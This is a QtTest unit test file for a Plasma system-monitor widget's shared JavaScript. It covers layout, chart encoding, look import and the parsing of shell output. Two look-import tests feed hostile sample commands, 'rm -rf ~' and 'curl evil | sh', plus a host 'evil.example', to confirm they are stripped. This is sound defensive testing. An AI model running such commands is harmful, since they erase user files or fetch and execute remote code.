import QtQuick
import QtTest
import "../package/contents/ui/Sections.js" as Sections
import "../package/contents/ui/SectionModels.js" as SectionModels
import "../package/contents/ui/diagram/DiagramData.js" as Data
import "../package/contents/ui/studio/Looks.js" as Looks
import "../package/contents/ui/studio/Schema.js" as Schema
import "../package/contents/ui/Probes.js" as Probes
import "../package/contents/ui/Format.js" as Format
import "../package/contents/ui/DemoData.js" as DemoData

// The JavaScript shared by the widget, both studios and the website.
TestCase {
    name: "SharedLogic"

    readonly property var defaults: ({
            sections: "",
            activeSection: 2,
            chartType: 0,
            bgColor: "#800d0f1a",
            cpuColor: "#44ddaa",
            customCmd: "cat /proc/loadavg",
            targets: "1.1.1.1",
            layoutColumns: 1,
            glowLine: true,
            historySize: 60,
            cpuTitle: "CPU"
        })

    // A monitor with MonitorCore's property names.
    function fakeMonitor() {
        return {
            cpuPercent: 40,
            cpuHistory: [10, 20, 40],
            corePercents: [30, 50, 20, 60, 10, 5, 5, 5, 5, 5],
            coreHistories: Array.from({
                length: 10
            }, () => [1, 2, 3]),
            histories: [[10, -1, 40, 200]],
            activeTarget: 0,
            targetList: ["1.1.1.1"],
            lastPing: 200,
            avgPing: 83,
            jitter: 5,
            lossPercent: 25,
            hoveredLine: "",
            hoveredCore: -1,
            dlHistory: [100, 5000],
            ulHistory: [10, 20],
            downloadSpeed: 5000,
            uploadSpeed: 20,
            sessionDlBytes: 2048,
            sessionUlBytes: 1024,
            disabled: [],
            isLineDisabled(key) {
                return this.disabled.indexOf(key) !== -1;
            }
        };
    }

    function test_sectionsParseKeepsOrderAndDropsUnknown() {
        compare(Sections.parse("memory,cpu,bogus,cpu", 2), ["memory", "cpu"]);
    }
    function test_sectionsParseFallsBackToLegacyIndex() {
        compare(Sections.parse("", 1), ["network"]);
        compare(Sections.parse("", 99), ["cpu"]);
    }
    function test_placementFillsRowsAndSpans() {
        const p = Sections.placement(["cpu", "memory", "network", "disk"], 2, ["network"]);
        compare(p[0], {
            row: 0,
            column: 0,
            span: 1
        });
        compare(p[1], {
            row: 0,
            column: 1,
            span: 1
        });
        compare(p[2], {
            row: 1,
            column: 0,
            span: 2
        });
        compare(p[3], {
            row: 2,
            column: 0,
            span: 1
        });
    }
    function test_placementSpanStartsItsOwnRow() {
        const p = Sections.placement(["cpu", "network", "disk"], 3, ["network"]);
        compare(p[1].row, 1, "a spanning section after a partial row starts a new row");
        compare(p[2].row, 2);
    }

    function test_encodeHeaderAndSamples() {
        const series = [Data.normalize({
                values: [0, 50, 100, -1],
                color: "#ff0000",
                bands: [0, 1, 2, 0],
                gaps: true
            }, {
                lineWidth: 2,
                fill: 0.5
            })];
        const e = Data.encode(series, 100, "line", 2);
        compare(e.width, 256);
        compare(e.bytes[0], 255, "red channel of the colour");
        compare(e.bytes[5], 32, "line width 2 × 16");
        compare(e.bytes[8] & 4, 4, "gaps flag");
        compare(e.bytes[12] * 256 + e.bytes[13], 4, "sample count");
        const at = i => (256 + i) * 4;
        compare(e.bytes[at(0)] * 256 + e.bytes[at(0) + 1], 0);
        compare(e.bytes[at(2)] * 256 + e.bytes[at(2) + 1], 65534, "full scale");
        compare(e.bytes[at(3)] * 256 + e.bytes[at(3) + 1], 65535, "negative is a gap");
        compare(e.bytes[at(1) + 2], 1, "band in the blue channel");
    }
    function test_encodeClampsAboveScaleAndKeepsAlphaOpaque() {
        const e = Data.encode([Data.normalize({
                values: [500, 20],
                color: "#fff"
            }, {
                lineWidth: 2,
                fill: 0
            })], 100, "line", 2);
        compare(e.bytes[1024] * 256 + e.bytes[1025], 65534);
        for (let i = 3; i < e.bytes.length; i += 4)
            compare(e.bytes[i], 255, "a translucent texel would be premultiplied and lose data");
    }
    function test_gaugesEncodeOneCurrentValue() {
        const e = Data.encode([Data.normalize({
                values: [1, 2, 3],
                value: 42,
                color: "#fff"
            }, {
                lineWidth: 2,
                fill: 0
            })], 100, "donut", 2);
        compare(e.bytes[12] * 256 + e.bytes[13], 1);
        compare(Math.round((e.bytes[1024] * 256 + e.bytes[1025]) / 65534 * 100), 42);
    }
    function test_autoMaxHasAFloorAndHeadroom() {
        compare(Data.autoMax([[1, 2], [3]], 1024, 1.2), 1024);
        compare(Data.autoMax([[2000]], 1024, 1.5), 3000);
    }

    function test_lookApplyNeverTouchesCommandsOrHosts() {
        const draft = Object.assign({}, defaults, {
            customCmd: "my own command",
            targets: "10.0.0.1",
            cpuColor: "#123456"
        });
        const next = Looks.apply(draft, defaults, {
            cpuColor: "#abcdef",
            customCmd: "rm -rf ~",
            targets: "evil.example"
        });
        compare(next.cpuColor, "#abcdef");
        compare(next.customCmd, "my own command");
        compare(next.targets, "10.0.0.1");
    }
    function test_lookApplyResetsOtherLookSettings() {
        const draft = Object.assign({}, defaults, {
            bgColor: "#ff000000",
            chartType: 3
        });
        const next = Looks.apply(draft, defaults, {
            chartType: 1
        });
        compare(next.bgColor, defaults.bgColor, "a look is the whole appearance, not a patch");
        compare(next.chartType, 1);
    }
    function test_decodeDropsCommandsAndRejectsBadTypes() {
        const look = Looks.decode(JSON.stringify({
            format: Looks.FORMAT,
            version: 1,
            name: "x",
            settings: {
                cpuColor: "#111111",
                customCmd: "curl evil | sh",
                osFetchCmd: "boom"
            }
        }), defaults);
        compare(Object.keys(look.settings), ["cpuColor"]);
        let threw = false;
        try {
            Looks.decode(JSON.stringify({
                settings: {
                    chartType: "3"
                }
            }), defaults);
        } catch (error) {
            threw = true;
        }
        verify(threw, "a string where a number belongs is rejected");
    }
    function test_encodeDecodeRoundTrip() {
        const text = Looks.encode("Mine", {
            cpuColor: "#222222",
            layoutColumns: 2
        }, defaults);
        const look = Looks.decode(text, defaults);
        compare(look.name, "Mine");
        compare(look.settings.layoutColumns, 2);
        verify(Looks.matches(Looks.apply(defaults, defaults, look.settings), defaults, look.settings));
    }

    function test_schemaStylesRoundTrip() {
        const map = Schema.parseStyles("cpu:line, memory:donut,bad:nope");
        compare(map, {
            cpu: "line",
            memory: "donut"
        });
        compare(Schema.formatStyles(map), "cpu:line,memory:donut");
    }
    function test_everyRowKeyExistsInDefaultsOrHyprland() {
        const hypr = ["monitor", "hAnchor", "verticalPosition", "screenMargin", "widgetWidth", "desktopLayer"];
        const xml = (() => {
                const x = new XMLHttpRequest();
                x.open("GET", Qt.resolvedUrl("../package/contents/config/main.xml"), false);
                x.send();
                return x.responseText;
            })();
        for (const section of Schema.SECTIONS)
            for (const row of section.rows)
                if (row.k)
                    verify(hypr.indexOf(row.k) !== -1 || xml.indexOf('name="' + row.k + '"') !== -1, "studio row for unknown setting " + row.k);
    }

    // The panel pill: which sections, and readings of a fixed width.
    function test_panelShowsPickedSectionsElseTheFirst() {
        compare(Sections.panelIds({
            sections: "memory,cpu",
            panelSections: ""
        }), ["memory"]);
        compare(Sections.panelIds({
            sections: "memory,cpu",
            panelSections: "network, gpu,network"
        }), ["network", "gpu"]);
    }
    function test_pillCaptionsAreShortUnlessRenamed() {
        compare(Sections.shortTitle("sensors", defaults), "Temp");
        compare(Sections.shortTitle("sensors", Object.assign({}, defaults, {
            hwSensorsTitle: "Die"
        })), "Die");
    }
    function test_pillReadings() {
        const m = fakeMonitor();
        const cpu = SectionModels.pill("cpu", m, defaults);
        compare(cpu.lines[0].text, "40%");
        compare(cpu.ratio, 0.4);
        compare(cpu.history, m.cpuHistory);
        const net = SectionModels.pill("network", m, defaults);
        compare(net.lines.map(l => l.mark), ["↓", "↑"]);
        compare(net.lines[0].text, "4.9K/s");
        compare(net.history2, m.ulHistory);
        verify(net.max >= 5000);
        // Latency gaps (-1) draw as zero in the sparkline.
        verify(SectionModels.pill("ping", m, defaults).history.every(v => v >= 0));
    }
    function test_shortRatesStayWithinTheWidestSample() {
        for (const v of [0, 9.94, 999, 1000, 10239, 1023999, 5e9, 999e12])
            verify(Format.short(v).length <= Format.SHORT_WIDEST.length, Format.short(v));
    }

    function test_cpuModelNestsAtMostEightCoreRings() {
        const m = fakeMonitor();
        const model = SectionModels.cpu(m, Object.assign({}, defaults, {
            showCpuCores: true
        }));
        verify(model.cores);
        const rings = model.series("donut").filter(s => s.ring);
        verify(rings.length <= 8);
        verify(rings.every(s => s.ring[0] >= 0.25));
        compare(model.series("line").length, 11, "total plus every core as lines");
    }
    function test_hiddenLinesLeaveTheChart() {
        const m = fakeMonitor();
        m.disabled = ["dl"];
        const series = SectionModels.network(m, defaults).series("line");
        compare(series.length, 1);
        compare(series[0].label, "Upload");
    }
    function test_pingModelMarksBandsGapsAndAlert() {
        const m = fakeMonitor();
        const model = SectionModels.ping(m, Object.assign({}, defaults, {
            pingThresholdColors: true,
            latencyThreshold: 30,
            pingCritColor: "#ff0000"
        }));
        const s = model.series("line")[0];
        compare(s.bands, [0, 0, 1, 2]);
        verify(s.gaps);
        compare(model.readingColor, "#ff0000");
        compare(model.markers[0].value, 30);
        compare(model.stats.map(st => st.label), ["AVG", "JITTER", "LOSS", "MIN / MAX"]);
    }

    function test_colourByLoad() {
        const m = fakeMonitor();
        m.cpuHistory = [10, 75, 95];
        m.cpuPercent = 95;
        const off = SectionModels.cpu(m, defaults);
        compare(off.readingColor, "#44ddaa");
        verify(off.series("line")[0].bands === undefined);
        const cfg = Object.assign({}, defaults, {
            loadColors: true,
            loadWarn: 70,
            loadCrit: 90
        });
        const on = SectionModels.cpu(m, cfg);
        compare(on.series("line")[0].bands, [0, 1, 2]);
        compare(on.series("donut")[0].color, "#ff4444", "gauges take the current level's colour");
        compare(on.readingColor, "#ff4444");
        compare(on.markers[0].value, 70);
    }

    function test_textColourFollowsSolidCard() {
        compare(Sections.textColor({
            useSystemTextColor: true
        }, "#eff0f1"), "#eff0f1");
        compare(Sections.textColor({
            useSystemTextColor: true,
            surfaceStyle: "solid"
        }, "#eff0f1"), "#1e241d");
        compare(Sections.textColor({
            useSystemTextColor: false,
            customTextColor: "#123456",
            surfaceStyle: "solid"
        }, "#eff0f1"), "#123456");
    }

    // ── Probes.js: shell output → objects ─────────────────────────────────────

    function test_interfacesParseKindsAddressesAndRoutes() {
        const list = Probes.parseInterfaces(["if wlp2s0 up wifi aa:bb:cc:dd:ee:ff -", "if enp5s0 down ethernet 11:22:33:44:55:66 1000", "if wg0 unknown vpn - -", "if docker0 down virtual 02:42:00:00:00:01 -", "ip wlp2s0 192.168.1.20/24", "ip wlp2s0 10.0.0.5/8", "ip wg0 10.8.0.2/32", "route wlp2s0 600", "route wlp2s0 20", "route wg0 50", ""].join("\n"));
        compare(list.map(e => e.name), ["wlp2s0", "enp5s0", "wg0", "docker0"]);
        compare(list[0].kind, "wifi");
        compare(list[0].ip, "192.168.1.20", "the first address wins, without its prefix");
        compare(list[0].route, 20, "the lowest metric of several default routes");
        compare(list[0].speed, 0);
        compare(list[1].up, false);
        compare(list[1].speed, 1000);
        compare(list[1].route, -1);
        compare(list[2].up, true, "tunnels in state unknown count as up");
        compare(list[2].mac, "");
        compare(list[3].kind, "virtual");
    }

    function test_autoInterfaceFollowsTheDefaultRoute() {
        const list = Probes.parseInterfaces("if wlp2s0 up wifi - -\nif enp5s0 up ethernet - -\nif wg0 unknown vpn - -\nroute wlp2s0 600\nroute wg0 50\n");
        compare(Probes.autoInterface(list, {}, "x"), "wg0");
        // No default route: the busiest connected physical link.
        const noRoute = Probes.parseInterfaces("if wlp2s0 up wifi - -\nif enp5s0 up ethernet - -\nif wg0 unknown vpn - -\n");
        compare(Probes.autoInterface(noRoute, {
            wlp2s0: {
                rx: 10,
                tx: 0
            },
            enp5s0: {
                rx: 500,
                tx: 5
            },
            wg0: {
                rx: 9000,
                tx: 0
            }
        }, "x"), "enp5s0");
        compare(Probes.autoInterface([], {}, "eth0"), "eth0");
    }

    function test_storageKeepsOneRowPerDeviceAndDropsSmallMounts() {
        const list = Probes.parseStorage(DemoData.DF, "");
        compare(list.map(r => r.mount), ["/", "/mnt/data", "/run/media/usb"], "root first, /home folds into /, /boot is under 256 MiB");
        compare(list[0].fs, "btrfs");
        compare(list[0].size, 1998694907904);
        // Percent as df computes it: used of used + available.
        fuzzyCompare(list[1].percent, 3521377894400 / (3521377894400 + 415440912384) * 100, 1e-9);
    }

    function test_storageMountListPicksAndOrders() {
        compare(Probes.parseStorage(DemoData.DF, " /mnt/data, /boot ,/ ").map(r => r.mount), ["/mnt/data", "/boot", "/"], "listed mounts show even when small");
        compare(Probes.parseStorage(DemoData.DF, "/nope").length, 0);
        compare(Probes.parseStorage("", "").length, 0);
        const spaced = "Filesystem Type 1-blocks Used Available Capacity Mounted on\n/dev/sdc1 ext4 1073741824 0 1073741824 0% /mnt/My Disk";
        compare(Probes.parseStorage(spaced, "")[0].mount, "/mnt/My Disk");
    }

    function test_usageInTheWholesUnit() {
        compare(Format.usage(1215130124288, 1998694907904), "1.1 / 1.8 TiB");
        compare(Format.usage(61439868928, 63999836160), "57 / 60 GiB");
        compare(Format.usage(0, 512 * 1048576), "0 / 512 MiB");
        compare(Format.usage(10, 100), "10 / 100 B");
    }

    function test_processNamesDropNixWrappers() {
        compare(Probes.cleanName(".plasmashell-wr"), "plasmashell");
        compare(Probes.cleanName(".firefox-wrapped"), "firefox");
        compare(Probes.cleanName(".kwin_wayland-w"), "kwin_wayland");
        compare(Probes.cleanName("kworker/0:1"), "kworker/0:1");
    }

    function test_procSnapshotReadsTicksRssAndOddNames() {
        // 52 fields after comm, as in /proc/<pid>/stat.
        const tail = (utime, stime, rss) => {
            const f = ["S"].concat(Array(51).fill("0"));
            f[11] = String(utime);
            f[12] = String(stime);
            f[21] = String(rss);
            return f.join(" ");
        };
        const text = ["cpu  100 0 50 800 10 0 5 0 0 0", "MemTotal:       32768000 kB", "42 (Web Content) " + tail(30, 12, 1000), "77 (weird) (name)) " + tail(1, 2, 3), "99 (short) S 1 2", ""].join("\n");
        const snap = Probes.parseProcSnapshot(text);
        compare(snap.total, 965, "first eight cpu fields");
        compare(snap.memTotal, 32768000 * 1024);
        compare(Object.keys(snap.procs).sort(), ["42", "77"], "truncated lines are skipped");
        compare(snap.procs["42"].name, "Web Content");
        compare(snap.procs["42"].ticks, 42);
        compare(snap.procs["42"].rss, 1000 * 4096);
        compare(snap.procs["77"].name, "weird) (name)");
        compare(snap.procs["77"].ticks, 3);
    }

    function test_topProcessesRanksGroupsAndCounts() {
        const snap = (total, procs) => ({
                    total: total,
                    memTotal: 1000,
                    procs: procs
                });
        const prev = snap(1000, {
            1: {
                name: "a",
                ticks: 10,
                rss: 100
            },
            2: {
                name: "b",
                ticks: 10,
                rss: 50
            },
            3: {
                name: "b",
                ticks: 10,
                rss: 50
            }
        });
        const next = snap(1200, {
            1: {
                name: "a",
                ticks: 40,
                rss: 100
            },
            2: {
                name: "b",
                ticks: 30,
                rss: 50
            },
            3: {
                name: "b",
                ticks: 30,
                rss: 50
            },
            4: {
                name: "c",
                ticks: 999,
                rss: 400
            }
        });
        const grouped = Probes.topProcesses(prev, next, 5, "cpu", true);
        compare(grouped.map(p => p.name), ["b", "a", "c"], "c is new: no CPU yet, so it ranks by memory among the idle");
        compare(grouped[0].count, 2);
        fuzzyCompare(grouped[0].cpu, 20, 1e-9);
        fuzzyCompare(grouped[1].cpu, 15, 1e-9);
        compare(grouped[0].memPercent, 10);
        compare(Probes.topProcesses(prev, next, 5, "cpu", false).length, 4);
        compare(Probes.topProcesses(prev, next, 5, "memory", true)[0].name, "c");
        compare(Probes.topProcesses(prev, next, 2, "cpu", true).length, 2);
        compare(Probes.topProcesses(null, next, 5, "cpu", true)[0].cpu, 0, "the first poll has no CPU delta");
    }

    function test_demoProcessesStayPlausible() {
        for (let i = 1; i < 60; i++) {
            const top = Probes.topProcesses(DemoData.procSnapshot(i - 1), DemoData.procSnapshot(i), 10, "cpu", true);
            const sum = top.reduce((a, p) => a + p.cpu, 0);
            verify(sum > 10 && sum < 100, "step " + i + ": " + sum);
            verify(top.every(p => p.cpu >= 0));
        }
    }
}
